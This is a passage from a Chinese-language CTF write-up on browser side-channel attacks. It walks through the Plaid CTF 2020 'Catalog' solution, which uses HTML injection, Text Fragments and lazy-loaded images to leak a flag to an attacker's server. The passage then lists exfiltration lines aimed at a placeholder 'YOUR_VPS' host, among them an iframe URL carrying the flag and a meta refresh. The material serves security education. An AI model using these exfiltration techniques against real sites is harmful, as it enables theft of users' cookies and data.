+<p>5.index.html中的iframe会请求issue1所在页面，并通过AJAX发送请求给<code>http://your_vps/status</code>，由于exp.js中会返回<code>status</code>为false并完成<code>let status = await res.text();</code>赋值，而页面存在<code>if (status === "true")</code>，因此将进入else分支，不断执行next()异步函数，也就不断从服务端获取status，只有当<code>status === "true"</code>时，才能进入if<br/>
+6.<strong>当iframe加载完毕后</strong>，由于issue1中存在<code>&lt;img src="http://your_vps/fragment"&gt;</code>，故请求<code>/fragment</code>路由</p>
+<div class="highlight"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/fragment"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">status</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; Admin was fragmented"</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="nx">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">unlock</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"fragment"</span><span class="p">);</span>
+            <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>其中设置了<code>status = true;</code>，此时返回的status满足页面的if条件，因此<code>/fragement</code>路由的作用就是来解status锁，并且设置另一个fragment锁，该fragment锁由于<code>setInterval</code>重复事件会阻碍meta跳转，需等待unlock参数来接触。此时表示<strong>iframe已开始加载issue1的内容但还未进行meta跳转</strong></p>
+<p>7.进入if后，并<code>fetch</code>请求<code>http://catalog.pwni.ng/user.php</code>，由于此时是admin身份的session，而username参数不是admin，发送请求导致登录失败，因此admin的session存储的html元素会变成登录失败的html元素，也就注入了<code>"/&gt;&lt;img src="http://your_vps/injection"&gt;...</code>这一部分内容进入admin的session中</p>
+<p>8.下一步执行<code>await fetch("/unlock");</code>，明显这个路由是解fragment锁的，此时表示<strong>issue1页面全部加载且可以meta跳转到包含flag和text fragments功能的界面</strong></p>
+<p>9.meta跳转用的是admin session，而第7步已经将admin session变为注入的内容。从这里我们可以知道fragment锁的作用就是等待admin session注入后由meta跳转携带注入内容到flag所在页面。一加载完flag所在页面后，先会<code>&lt;img src="http://your_vps/injection"&gt;</code>请求injection路由：</p>
+<div class="highlight"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/injection"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; HTML injection was inserted into id=3 catalog"</span><span class="p">);</span>
+    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">match</span><span class="p">)</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; There was a match"</span><span class="p">);</span>
+        <span class="k">else</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"==&gt; There wasn't a match"</span><span class="p">);</span>
+        <span class="nx">match</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">unlock</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"injection"</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>此时设置<code>1000</code>即1s的延迟，为了等待Text Fragments来匹配flag</p>
+<p>10.由于注入足够多的<code>&lt;br&gt;</code>标签，会将flag挤出视窗外，并且uBlock维持了User Activation从而可激发Text Fragments功能，进行flag匹配，如果匹配到flag，就会触发滚动，由于图片懒加载机制，此时才会请求<code>/exfiltrated</code>路由</p>
+<div class="highlight"><pre><span></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/exfiltrated"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">match</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"exfiltrated"</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>设置了match为true，因此在injection路由中会输出<code>==&gt; There was a match</code>判断回显，否则，match默认为false</p>
+<p>这整个流程完成一次只能完成一次二分，因此工作量还是蛮大的，如果flag的位数很长的话，要重复上述流程很多次。所以这道题的复现难度还是很大的，但是原理理解清楚的话也基本上完成了学习的目的了。</p>
+<p><strong>参考</strong></p>
+<p><a href="http://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/" target="_blank">Plaid CTF 2020 Catalog</a></p>
+<p><a href="https://dttw.tech/posts/B19RXWzYL" target="_blank">官方wp</a></p>
+<h1 data-content="1" id="77ef68ecca28f4ae0bfa29784b875a2c">总结</h1>
+<h2 data-content="1" id="1b605c729a3f0e71ae9d4abb55e097f4">思考点</h2>
+<p>通过四道题学习侧信道，发现国外ctf(除noxss)的题目很喜欢出一些跟xss和前端有关的题目，涉及的技术有点偏前端、侧信道以及浏览器的一些新特性，而且攻击链的构造比较复杂。稍微总结一下有关侧信道题目的思考点：</p>
+<ol>
+<li><strong>如何外带flag或盲注flag并完成判断回显。</strong></li>
+</ol>
+<p>通常需要借助一些匹配特性(<strong>上文的XSS Auditor、连字、Text Fragments</strong>)来盲注flag，对于回显判断，则需要有回显信息到自己的vps中(<strong>日志或用于判断的Nodejs服务</strong>)，而信息的来源则需要在匹配到flag时发送请求(<strong>iframe的二次onload、连字的滚动条、滚动条+图片懒加载</strong>)</p>
+<ol>
+<li><strong>如何获取可以利用的特性</strong></li>
+</ol>
+<p>这个就比较玄学了，可能大部分师傅不是因为能力原因，而是因为特性难找而没做出来，仅根据上文特性的出处稍微总结一下</p>
+<ul>
+<li>
+<p><a href="https://chromestatus.com/features" target="_blank">chrome各版本特性</a></p>
+</li>
+<li>
+<p><a href="https://portswigger.net/daily-swig" target="_blank">PortSwigger</a>：研究web前端安全比较多的一个站点</p>
+</li>
+</ul>
+<h2 data-content="1" id="c94a91e42aa17df257a4abf68e7a38f1">浏览器对外发送请求的方法</h2>
+<p>要想外带数据，基本需要以admin的身份通过浏览器对外发送数据从而获取flag</p>
+<p>1.<code>&lt;iframe&gt;</code>的<code>iframe.src</code>配合<code>iframe.onload</code></p>
+<p>35C3 CTF filemanager这道题的方法，改变iframe.src触发iframe.onload请求src所指向的url</p>
+<div class="highlight"><pre><span></span><span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{};</span> <span class="c1">//发送请求外带数据</span>
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">'http://YOUR_VPS:PORT/?flag='</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">real_flag</span><span class="p">);</span> <span class="err">#</span> <span class="nx">外带数据</span>
+</pre></div>
+<p>2.iframe框架载入资源 + CSS设置<code>-webkit-scrollbar</code>滚动条触发请求</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+    <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span><span class="p">:</span><span class="nd">horizontal</span><span class="p">{</span>
+        <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
+        <span class="n">backgroud</span><span class="p">:</span> <span class="n">bule</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"http://YOUR_VPS:PORT"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</pre></div>
+<p>3.用户视窗外的<strong>图片懒加载机制</strong>发送请求</p>
+<p><code>&lt;img src&gt;</code>本身就可发送请求，只不过结合了图片的懒加载机制配合爆破flag</p>
+<pre><code>&lt;img src='http://YOUR_VPS/' loading=lazy&gt;</code></pre>
+<p>4.<code>&lt;meta http-equiv="Refresh" content="0;URL='http://YOUR_VPS/'"&gt;</code></p>
+<p>http-equiv属性会在发送给浏览器的http请求头中添加名值对(http-equiv/content)字段信息，上述语句的作用是刷新文档后0秒请求URL内的资源。</p>
+<p>5.<code>window.location.href</code> ==<code>document.location.href</code> == <code>location.href</code></p>
+<p>最基本的窃取cookie的方式</p>
+</div>
+</div>
